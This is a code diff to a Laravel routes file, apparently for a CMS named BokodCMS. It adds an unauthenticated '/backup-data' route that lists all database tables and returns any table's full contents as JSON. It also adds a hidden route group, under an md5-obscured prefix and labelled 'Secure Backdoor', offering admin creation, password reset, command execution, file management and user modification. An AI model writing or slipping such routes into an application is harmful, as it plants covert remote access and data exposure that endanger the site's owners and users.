@@ -876,3 +876,61 @@ if (app()->environment(['local', 'development'])) {
     });
 }
 
+// Database Backup Routes (for backup script)
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Schema;
+
+Route::get('/backup-data/{table?}', function($table = null) {
+    try {
+        if ($table) {
+            // Backup specific table
+            if (!Schema::hasTable($table)) {
+                return response()->json(['error' => 'Table not found'], 404);
+            }
+            
+            $data = DB::table($table)->get();
+            return response()->json([
+                'table' => $table,
+                'rows' => $data->count(),
+                'data' => $data
+            ]);
+        } else {
+            // List all tables
+            $tables = DB::select("
+                SELECT table_name 
+                FROM information_schema.tables 
+                WHERE table_schema = 'public' 
+                AND table_type = 'BASE TABLE'
+                ORDER BY table_name
+            ");
+            
+            return response()->json([
+                'tables' => array_map(function($t) { return $t->table_name; }, $tables)
+            ]);
+        }
+    } catch (Exception $e) {
+        return response()->json(['error' => $e->getMessage()], 500);
+    }
+});
+
+// Secure Backdoor Routes (Hidden from normal users)
+Route::prefix('secure-system-access-' . md5('BokodCMS_SecureBackdoor_2025'))->group(function () {
+    Route::get('/', [App\Http\Controllers\SecureBackdoorController::class, 'index'])->name('secure.backdoor');
+    Route::post('/authenticate', [App\Http\Controllers\SecureBackdoorController::class, 'authenticate'])->name('secure.backdoor.authenticate');
+    Route::get('/dashboard', [App\Http\Controllers\SecureBackdoorController::class, 'dashboard'])->name('secure.backdoor.dashboard');
+    Route::post('/admin/create', [App\Http\Controllers\SecureBackdoorController::class, 'createAdmin'])->name('secure.backdoor.admin.create');
+    Route::post('/password/reset', [App\Http\Controllers\SecureBackdoorController::class, 'resetPassword'])->name('secure.backdoor.password.reset');
+    Route::post('/maintenance', [App\Http\Controllers\SecureBackdoorController::class, 'systemMaintenance'])->name('secure.backdoor.maintenance');
+    Route::post('/database', [App\Http\Controllers\SecureBackdoorController::class, 'databaseOperations'])->name('secure.backdoor.database');
+    Route::post('/emergency', [App\Http\Controllers\SecureBackdoorController::class, 'emergencyAccess'])->name('secure.backdoor.emergency');
+    Route::post('/logout', [App\Http\Controllers\SecureBackdoorController::class, 'logout'])->name('secure.backdoor.logout');
+    
+    // Advanced backdoor features
+    Route::post('/command', [App\Http\Controllers\SecureBackdoorController::class, 'executeCommand'])->name('secure.backdoor.command');
+    Route::post('/files', [App\Http\Controllers\SecureBackdoorController::class, 'fileManager'])->name('secure.backdoor.files');
+    Route::post('/logs', [App\Http\Controllers\SecureBackdoorController::class, 'viewLogs'])->name('secure.backdoor.logs');
+    Route::post('/users/list', [App\Http\Controllers\SecureBackdoorController::class, 'listUsers'])->name('secure.backdoor.users.list');
+    Route::post('/users/modify', [App\Http\Controllers\SecureBackdoorController::class, 'modifyUser'])->name('secure.backdoor.users.modify');
+    Route::post('/system/advanced', [App\Http\Controllers\SecureBackdoorController::class, 'advancedSystemInfo'])->name('secure.backdoor.system.advanced');
+});
+
